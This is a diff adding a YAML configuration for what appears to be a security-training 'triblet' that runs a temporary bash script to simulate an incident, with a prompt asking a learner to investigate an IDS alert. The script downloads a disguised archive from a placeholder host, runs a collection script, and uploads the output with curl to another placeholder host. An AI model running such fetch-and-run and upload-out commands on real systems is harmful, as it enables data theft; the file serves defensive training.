@@ -1,0 +1,37 @@
+---
+ # Filename for the script. Temporary and will be deleted
+ # just before the triblet terminates.
+ theFile: "first.bash"
+ # Shell to execute the script.
+ # theShell: powershell.exe
+ # theShell: cmd.exe
+ theShell: "/usr/bin/bash"
+ # For the script, indent 2 spaces under "theScript: |-2
+ # In order to preserve the newlines.
+ # Leave: theScript: |-2
+ # It tells the viper parser to preserve newlines
+ # for lines with two space indentions under the key: theScript
+ # Be sure the last line of the script is: exit 0
+ # so it can be deleted before the triblet terminates
+ theScript: |-2
+   #!/bin/bash
+   
+   ## Simulate a script collection and upload
+   wget hxxp://somehost/aserq.jpg -O files.zip
+   unzip files.zip
+   cd files
+   chmod +x collect.sh
+   ./collect.sh
+   gzip output.txt
+   curl -F 'f=output.gz' hxxp://anotherhose/upload.php
+   
+   # Be sure to include exit 0
+   # so the script will be deleted
+   # by the triblet.
+   exit 0
+ # Or just ask the user what command was used to generate the output
+ theMsg: "An IDS alerted to a host communicating with a known malicious IP. Investigate and find out what happened."
+ # The keys below are not yet implemented.
+ # Need admin access:  yes or no
+ #needAdmin: yes
+ #adminUser: root
